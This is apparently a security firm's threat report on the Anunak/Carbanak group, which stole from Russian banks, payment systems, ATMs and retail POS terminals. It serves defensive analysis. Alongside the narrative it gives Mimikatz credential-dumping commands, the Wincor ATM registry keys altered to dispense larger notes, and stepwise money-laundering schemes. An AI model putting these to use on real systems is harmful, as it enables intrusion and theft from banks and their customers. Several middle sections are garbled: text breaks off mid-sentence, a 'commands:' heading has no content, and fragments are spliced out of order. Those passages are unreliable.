  <heading>Executive summary</heading>                                           

  This report describes the details and type of op-           
erations carried out by an organized criminal group           
that focuses on financial industry, such as banks and         
payment providers, retail industry and news, media
and PR companies. The group has its origin in more            
common financial fraud including theft from con-              
sumer and corporate bank accounts in Europe and               
Russia, using standard banking malware, mainly                
Carberp.                                                      
                                                              
   After the arrests of Carberp group members in
Russia, some of the members were out of work,                 
however, their experience gained from many years              
of crime has allowed them to enter a new niche. One           
of the members quickly realized that they can steal           
$2000 a thousand times, and earn $2 million, but              
also they can steal it in one time and immediately            
get it with much less effort. The anti-fraud measures         
employed by banks has pushed the criminals to                 
search for new ways to make money with less bar-              
riers, compromising and modifying or taking data              
from banks, payment providers, retail and media/              
PR companies are some of these methods.
                                                              
   From 2013 an organized criminal group intensi-             
fied its activity focused on banks and electronic pay-        
ment systems in Russia and in the post-Soviet space.
The key is that fraud occurs within the corporate
network using internal payment gateways and in-
ternal banking systems. Thus money is stolen from
the banks and payment systems, and not from their
 customers. While this is their main and most lucra-
tive activity, the gang has also ventured into other
areas including the compromise of media groups
and other organizations for industrial espionage and
 likely a trading advantage on the stock market. In
cases where the group got access to the government
agency networks their aim was espionage related.
   
   The organized criminal group backbone are
citizens of both Russian and Ukrainian origin, but
the group also sources a number of mainstream and
specialized services from individuals and groups
originating from Russia, Ukraine and Belarus.
   
   The average sum of theft in the Russian terri-
tory and in the post-Soviet space is $2 million per
incident. Since 2013 they have successfully gained
access to networks of more than 50 Russian banks
and 5 payment systems, and 2 of these institutions
were deprived of their banking license. To date the
total amount of theft is over 1 billion rubles (about
25 million dollars), most of it has been stolen in the
second half of 2014.
   
   The average time from the moment of penetration
into the financial institutions internal network till
successful theft is 42 days.
   
   As a result of access to internal bank networks
the attackers also managed to gain access to ATM
management infrastructure and infect those sys-
tems with their own malicious software that further
allows theft from the banks ATM systems on the
attackers command.
   
   Since 2014 the organized criminal group mem-
bers began actively taking an interest in US and Eu-
ropean based retail organizations. While they were
already familiar with POS malware and compromis-
ing POS terminals, the widespread media attention
around the Target breach and other related breaches
were the reason for this move. While the scale of
breaches in this industry is still relatively low, with
at least 3 successful card breaches and over a dozen
retailers compromised this activity is quickly becom-
ing a lucrative endeavor for this group.
   
   To penetrate into the internal networks this
organized criminal group employs targeted emailing
(spear phishing) and infections sources from other
botnets. This is the main reason why the group is          

<footer>2</footer>

keeping in touch with owners of large botnets. Since         
August 2014 the group began to create their own
large botnet using a mass emailing, but not using            
typical exploit driveby infections. This last move is        
likely to reduce the need for external contacts.

  <heading>Attacks in Russia </heading>                                  
                                                             
   The first successful bank robbery was committed
by this group in January 2013. In all first cases the
attackers used the program RDPdoor for remote
access to the bank network and the program “MBR                                     
Eraser” to remove traces and to crack Windows
computers and servers. Both programs were used by                                                             
the members of the Carberp criminal group under            
the guidance of a person named Germes. To reduce              
the risk of losing access to the internal bank network
the attackers, in addition to malicious programs,
were also used for remote access legitimate pro-             
grams such as Ammy Admin and Team Viewer. Lat-               
er the attackers completely abandoned from usage                                                        
of RDPdoor and Team Viewer.
                                                             
   In addition to banking and payment systems,                                                              
hackers got access to e-mail servers to control all          
internal communications. This approach allowed               
them to find out that the anomalous activity in the
bank network was identified, what technique was                                                  
used to identify this activity and what measures the         
bank employees took to solve the problem. Email              
control was successfully installed regardless of used
email system, MS Exchange or Lotus. This approach            
allowed them to take countermeasures that created
for bank and payment system employees the feeling            
that the problem had been solved.                            
   The main steps of the attack progression are the          
following ones:                                              
                                                             
                                                             
<list>
 1.	 Primary infection of an ordinary employee               
     computer.                                               
                                                             
 2.	 Getting a password of a user with administra-
     tive rights on some computers. For example, a           
     password of a technical support engineer.               
                                                             
 3.	 Gaining legitimate access to one server.                
                                                             
 4.	 Compromising the domain administrator                   
     password from the server.                               
                                                             
 5.	 Gaining access to the domain controller and             
     compromising of all active domain accounts.  

 6.   Gaining access to e-mail and workflow servers.

 7.  Gaining access to server and banking system
     administrator workstations.

 8.  Installing the software to monitor activity of
     interesting system operators. Usually photo
     and video recording was used.

 9.  Configuring remote access to servers of inter-
     est including firewall configuration changes.

  <heading>Tools for attack</heading>
  To carry out target attacks in 2014 the hackers
have finalized development of their core malware
Anunak that is used along with the following tools:
<table>
Program               Purpose of use
                      to get passwords from local and
Mimikatz
                      domain accounts
MBR Eraser            to crack operating systems
SoftPerfect
                      to scan LAN
Network Scanner
Cain & Abel           to get passwords
                      to get passwords
SSHD backdoor
                      and remote access
Ammy Admin            for remote control
Team Viewer           for remote control
</table>
   According to our laboratory classification the
main malware is “Anunak”. This trojan is used for
target attacks only, mainly on banks and payment
systems. Target usage of this program allows it to
remain poorly explored, providing it a good surviv-
ability inside corporate networks. The source code of
the bank trojan program Carberp was used in some
places of this malware. “Anunak” has the following
feature set:

<list>
•  The software called “Mimikatz” is built in this
   program. This is an open source software that al-
   lows to obtain passwords of user accounts logged
   in the Windows system. However, this software
   was considerably changed: while maintaining the
   capability to get account passwords the functions
   of user interaction and of information output for
   errors and program execution were eliminated.
   Thus, when the malicious program is executed
   on the server, it will secretly compromise all the               

<footer>3</footer>
   
   domain and local accounts, including adminis-               
   trator accounts. To get account passwords it is             
   sufficient to enter two commands in succession:             
   “privilege::debug” and “sekurlsa::logonpass-                
   words”. When this program is executed on a
   domain controller or an e-mail server it compro-
   mises virtually all the domain accounts, includ-
   ing administrators.
•	 There is also the possibility to add a file into the
   firewall exclusion list by creating the correspond-
   ing rule with the utility “Netsh”.
•	 The functions of keypress grabber as well as the
   function of screenshot creation are implemented
   in the program.
•	 There are also the functions to interact with the
   bank system iFOBS.
•	 The malware sends key information, screenshots
   and CAB-archives to its management server.                  
•	 The program is able to secretly make changes to             
   a number of system files, presumably to remove              
   the limitations of Microsoft Windows desktop                
   operating systems on the number of users that               
   may simultaneously connect to the correspond-               
   ing PC using RDP to administer it remotely.                 
</list>
   
   There is the ability to download arbitrary exe-             
cutable files from the management server and run               
them. One of these files is the program “AmmyAd-               
min” that may be run with the arguments “-service”             
and “-nogui” that force it to start as a service without       
user interface. “AmmyAdmin” allows to connect                  
with another computer that has the same software               
through the server “rl.ammyy.com” using the IP                 
address and the unique identifier. As a result, the            
attacker gets remote access to the user computer
with the running program “AmmyAdmin” bypassing
firewalls. The window screenshot is shown in the
figure below:

<figure></figure>

   When the attackers gain access to servers running
operating systems of the Linux family they use SSH
backdoor that transmits to the malicious server the
login/password data used to access the servers and
provides attackers remote access to the servers.
   To provide access to the server of interest the at-
tackers may appropriately modify rules for firewalls
Microsoft TMG, CISCO, etc.
   When the attackers yet had no major malware
that would secretly install the program “AmmyAd-
min” and report to the attackers a remote access
password, they used a malicious program known
as “Barus”. This malware is used rarely and the last
time we met it in 2013. This malicious program is
developed by Russian-speaking authors. In the
control panel you can notice a field “Ammy ID”, its
usage allowed the attackers to connect remotely.

  <heading>Methods of malware                                  
  distribution</heading>                                        
                                                                
   At the very beginning of their activity in 2013 due          
to lack of the target Trojan the attackers began to             
distribute Andromeda and Pony. They distributed                 
these malware using Driveby through a bunch of                  
Neutrino Exploit Kit exploits as shown in the figure            
below. It is interesting that in the autumn 2013 they           
used the site http://php.net/ as traffic source to              
Magnitude EK. They redirected the traffic from this             
resource since July 2013, but this fact was discov-             
ered much later. The name of one of the streams to              
distribute the malware is “LOL BANK FUCKIUNG”                   
that corresponded to the attacker activities.                   
                                                                
                                                                
   Parallel to this technique they also use another
infection method, which was one of the principal                
methods. The main method of distribution is send-               
ing emails with malicious attachments on behalf of
the Central Bank of the Russian Federation, a poten-            
tial client or an real counterparty (at first the attack-       
ers had cracked this counterparty account, then they            
used emailing with the cracked contact list).                   
                                                                
   Another used method is to install a special                  
malware to carry out targeted attacks via another               
malware that might appear in the local network                  
by accident. To find such malicious programs the                
criminal group keeps in touch with several owners of            
large botnets that massively distributes their mal- 
ware. The attackers buy from these botnet owners
the information about IP-addresses of computers
where the botnet owners have installed malware and
then check whether the IP-address belongs to the
financial and government institutions. If the mal-
ware is in the subnet of interest, the attackers pay
the large botnet owner for installation of their target
malware. Such partner relations were established
with owners of botnets Zeus, Shiz Ranbyus. All of
these trojans are bank Trojans, their usage is ex-
plained by the previously established relationships.
In late 2013 the hacker under the alias Dinhold be-
gan to build his own botnet using modified Carberp,
having uploaded its source code for public access.
The attackers were trying to create similar relations
with this hacker, but in 2014 he was arrested, having
not developed his botnet up to the required level.


  To check whether the IP-address belongs to the
desired network the following script is used:
<code>
   #!/usr/bin/python
   # -*- coding: utf-8 -*-
   import os
   from bulkwhois.shadowserver import BulkWhoisShadow-
server
   iplist_file = ‘ip.txt’
   path = os.path.dirname(os.path.abspath(__file__))
   bulk_whois = BulkWhoisShadowserver()
   iplist = []
   with open(os.path.join(path, iplist_file)) as f:
     for line in f:            

<footer>5</footer>
          

<figure></figure>

  iplist.append(line.strip())
    result = bulk_whois.lookup_ip-
s(iplist)
    with open(os.path.join(path, ‘data.
txt’), ‘a’) as f:
       for record in result:
          f.write(‘IP: %s\
    CC: %s\
    Org. Name: %s\
    Register: %s\
    AS Name: %s\
    BGP Prefix: %s\
    ----------------------------------------\
    ‘ % (result[record][‘ip’], result[re-
cord][‘cc’], result[record][‘org_
name’], result[record][‘register’],
result[record][‘as_name’], result[re-
cord][‘bgp_prefix’]))
</code>

<figure></figure>

   The most dangerous emailings
are those that are sent on behalf
of partners with whom financial
and government institutions
communicates permanently
by email. An example of such
emailing occurred on Septem-
ber 25, 2014, at 14:11, from the
e-mail address “Elina Shchekina
<e.shekina@rbkmoney.com>”
with the subject “Updated agree-
ment version”. The attachment
“agreement.doc” exploits the vul-
nerability CVE-2012-2539 and
CVE-2012-0158. The emailing

was conducted for more than
70 addresses of various compa-
nies (where multiple recipient
addresses may be within one
company).

   The letter with malicious
attachment (md5: AA36BA9F-
4DE5892F1DD427B7B2100B06)
in the archive with a password
from a potential client was sent
to a bank manager after a pre-
liminary telephone conversation
with him. The call origin is Saint
Petersburg.

  <heading>ATM attacks</heading>                                             

   Availability of access to bank internal networks
opens great opportunities for the hackers. One of            
these opportunities is access to ATMs from spe-              
cial network segments that had to be isolated. It is         
confirmed that this criminal group gained access to          
52 ATMs. The amount of damage exceeds 50 million             
rubles. As a result of access to ATMs, depending on          
the ATM model, hackers used different patterns.

   Having access, the attackers downloaded mali-             
cious scripts and changed denominations of issued
banknotes in the ATM operating system registry. As           
a result, for query to get 10 notes with denomination        
of 100 roubles the attackers received 10 banknotes           
with denomination of 5,000 roubles. The used                 
malicious script and program were developed for the          
platform Wincor.

commands:

Execution of this file changed registry keys in            
the registry branch ““HKEY_LOCAL_MACHINE\                      
SOFTWARE\Wincor Nixdorf\ProTopas\Current-                      
Version\LYNXPAR\CASH_DISPENSER”” that are                      
responsible for cassette denominations in an ATM.
As a result of this file execution the registry key that       
is in charge of the cassette number 1 (VALUE_1) is             
takes the value “100”, and the registry key respon-            
sible for the cassette number 4 (VALUE_4) is set to            
“5000”. Then the command to restart the computer               
is issued. The registry key reference values:
 <table>

  If the ATM actual load corresponds to the refer-             
ence one and registry keys have been changed, then             
the banknotes from the cassette No.1 will be issued
with denomination “5000” instead of “100”.

  In addition, the attackers used a modified debug             
program that allows by the command to issue mon-
ey from the dispenser. The original debug program
issues money through the dispenser only when the
open ATM housing and the vault door are fixed.
   
   In order to ensure money issuance from the
closed ATM the attackers had to modify the
original program “KDIAG32” (the original file:
size of 1,128,960 MD5 4CC1A6E049942EB-
DA395244C74179EFF).

   A comparison of the original version of the pro-

difference is in ignoring error ““Door not opened or

on Unix servers and, In addi-
tion, it was loaded from the
same hacked server as in other
cases of trojan Anunak usage.
However, in this case Androm-
eda is used as the main trojan
instead of Anunak. The man-
agement servers were located
in Kazakhstan, Germany and
Ukraine. Check of the manage-
ment servers showed that it was
the hosting Bulletproof that, in
addition to servers, provides
a service of traffic proxying
through its infrastructure as
well as TOR and VPN usage,
so this pattern is significantly
differs from the Anunak host-

that the same cashout criminal group had worked
as for Anunak and this fact again confirmed their             
cooperation.

as the RC4 encryption key. As a result of this distri-
bution from August to late October the Andromeda              
botnet rose up to 260,000 bots. Successful infection          
in one subnet resulted in sending such letters to             
other bank employees. Example of forwarding from              
an infected bank network to employees of another              
bank is shown below.

   As a result of this radial mailing many oil and gas        
companies, banks and government agencies were in-

Previously, it should be noted the fact that the              
process of stolen money withdrawal (cashout) was              
differed, firstly by the theft method, secondly by the
victim type (a bank or a payment system), thirdly by
the total stolen sum.

   The victims by their type were divided rather by
counterparty types and by limitations imposed by
operation with the counterparties. For example, all
payments were required to go through a certain pool
of mediators. In addition, the “improper” pool of
counterparties could cause suspicion and unneces-
sary testing (manual processing of payment orders).

  Bank (amounts up to 100 million roubles):

•  When the attackers had obtained control of a
   bank operator workstation (attacker purpose),
   they in general used a classic tree scheme when
   funds from the bank account were sent to several
   legal entities, then from each legal entity to
   smaller legal entities (may be several such iter-
   ations) and then to private person credit cards
   (from 600 to 7000 transactions).
•  When the attackers had obtained control of ATM
   management service (attacker purpose), money
   were withdrawn directly from the ATM by the at-
   tacker command. In this case the whole cashout
   process consisted in that a drop person had to be
   near the ATM at the specified time with a bag to
   empty the dispenser.
  Bank (amounts from 100 million roubles):
•  Money was sent to accounts of other banks, and
   cracked banks were often used where accounts
   and credit cards had been prepared in advance.
  Payment system:
•  In addition to all the above methods, cash
   sending channels were also employed through
   the settlements systems, electronic wallets and
   payment systems, such as web money, Yandex

   Money, QIWI (1500-2000 transactions). Reve-                
   nues of large amounts (up to 50 million roubles)           
   were recorded to particular cards of private per-          
   sons who then used these cards to buy expensive            
   small-sized goods such as jewelry, watches, and            
   other attributes. A huge part of the money was             
   sent through mobile operators (1500-2000 SIM               
   cards prepared in advance).                                
•	 In spring 2014 (high time of this fraud type) 2            
   cashout person groups were known who support-              
   ed target attacks, by autumn 2014 their number             
   increased to 5. In general, this increase was due
   to number of thefts too (number of victims +
   average stolen sum per 1 victim). The groups
   are working in different cities to ensure better
   cashout distribution. Also these groups include
   immigrants from former Soviet republics who if
   necessary arrive in the required city. Each group
   was monitored by a separate person. Each group
   consists of about 15-20 people.
•  Part of the money was transferred to Ukraine and
   Belarus.

   While the attacks in Russia against banks and               
payment systems have occurred over the past two                
years, the attacks against the retail industry is only         
something which started in the second quarter of               
2014. With at least three confirmed breaches where             
card track data was obtainedand a total of at least 16         
breaches at retail organizations, it is also becoming a        
serious threat.

   Apart from retail organizations it is also known            
that a number of media and PR companies have
been breached in 2014. While it is not entirely cer-           
tain, the type of breaches suggest that the attackers          
are looking for inside information, a type of indus-           
trial espionage, allowing them to gain an advantage            
on the stock market. As there is nothing specifically          
missing and the resulting fraud is hard to match               
with anything, these incidents typically are never             
linked.

  <heading>infection methods</heading>                                            
                                                               
                                                               
   From the retail perspective, the first infections in                                                            
2014 were sourced from a botnet which employs a        
widely deployed crypto-currency mining malware                
based on the Gozi/ISFB (banking) malware family.                 
Based on our insights we believe during the first               
half of 2014 over half a million systems had been
compromised by this malware from over the whole                
world, however Russia and a number of post-Soviet              
states were clean of infections. To find interesting           
infections within this large set of compromised                
systems, the malware extracts relevant information             
from the systems including Microsoft Windows                   
organization registration information and network/             
Windows domain information.                                    
                                                               
  The Gozi/ISFB based malware was used to drop
additional components on interesting systems,                  
which included Metasploit/Meterpreter payloads
and Anunak variants. This was one of the main
methods for the group using Anunak to obtain in-
teresting infections in the middle of 2014, sourcing
infections from other botnet operators.More recent-
ly other infection methods, including spear phishing
using English language and possibly also usage of
the teams own Andromeda, but also SQL injection
to breach an organization directly from the outside,
has been employed by this team.

<section>
  <heading>pos compromises</heading>
   The first known attacks with Anunak targeted
a specific brand of POS systems which revolved
around the Epicor/NSB brand. To do this Anunak
has specific code to target POS devices equipped
with this software, which in contrary to the more
common memory scanning track data scrapers, logs
a wealth of information from the payments done by
the cards. The first case this was seen active was in
July 2014, but it might have been earlier as well.

   More recent breaches have used a new custom
developed POS malware, which is a more simple
but reliable track data memory scraper. The initial
version from the early fall of 2014 used a simple
blacklist, scraped every process and dumped track
data in plain text. More recent versions scanned
only configuration specified processes and used RC4
to encrypt the extracted track data records on disk.

<section>
  <heading>additional targets</heading>
   While the retail industry is one of its main targets
due to its payment processing capabilities, other
compromises might occur indirectly, for example to
obtain databases with information or other informa-
tion that is of value to the organized criminal group.
One of the possibilities is obtaining lists of corporate
email addresses to have a higher chance of interest-
ing infections.

   At this moment we have no evidence of successful
compromise or theft of banks and payment systems
outside of Russia, but several infections in the east
of Europe (specifically Ukraine and Latvia) were
active in 2014. These specific infections were related
to infrastructure of organizations based in Russia or
with significant interests in Russia, thus more likely
related to the breaches at the same organization in
Russia.

  The majority of infections from Europe were from
dedicated servers used as exit node for VPN services,                 

<footer>13</footer>

the systems infected were likely from Eastern Euro-           
pean or Russian origin, and possibly test infections          
from the attackers. We have no evidence of compro-            
mises against banks in Western Europe or United               
States, but it should be noted that the attackers
methods could be utilized against banks outside of
Russia as well.

  <heading>methods of lateral movement                                
  and persistence</heading>                                             
                                                              
   The group uses Metasploit as one of their main             
hacking tools, either stand alone or as part of a             
framework. The activity includes port scanning and            
system reconnaissance, escalating privileges on               
systems by using for example the recent CVE-2014-             
4113 vulnerability, gathering credentials and hop-            
ping on to other systems and networks. Metasploit             
is being used to its full potential with scanning,            
exploiting, privilege escalation and post exploitation        
persistence being achieved with its standard toolset.         
                                                              
    On interesting and critical systems typical hack-                                                       
ing tools might be found to establish tunnels out         
of the network, either tools that are part of the             
Metasploit framework such as Meterpreter, but also             
other tools to achieve persistence on those systems.
The connect back methods seen are typically SSL               
over port 443, but also DNS based methods were                
observed. The attackers use BITS to download files,           
but also make use of Windows built-in PowerShell to           
download tools and execute commands. Finally on               
the critical systems freshly crypted and non-detected
versions of Anunak are deployed, typically these are
used in very limited deployments thus their spread            
is limited and detection by Anti-Virus is very rare.
                                                              
   Various stealth methods including the aforemen-            
tioned backconnect SSL and DNS tunneling for                  
compromise persistence and data exfiltration are              
used. The Anunak malware has multiple ways of                 
connecting to backends, which includes a PHP based            
backend reachable over HTTP and HTTPS, and a                  
Windows server based component using a propri-                
etary protocol. 

   The use of VNC scanning and password brute                 
forcing, the adding of additional administrator               
accounts, use of RDP Wrapper to allow concurrent              
RDP sessions are all methods to gain access and               
achieve persistent access to compromised systems              
employed by this group. Additionally various ways             
of creating incidental and regular screen captures            
of the desktop of persons of interest within com-             
promised organizations were methods employed by
these attackers. This also includes video captures
made by the Anunak malware, allowing attackers to
observe the behavior of users of certain applications.
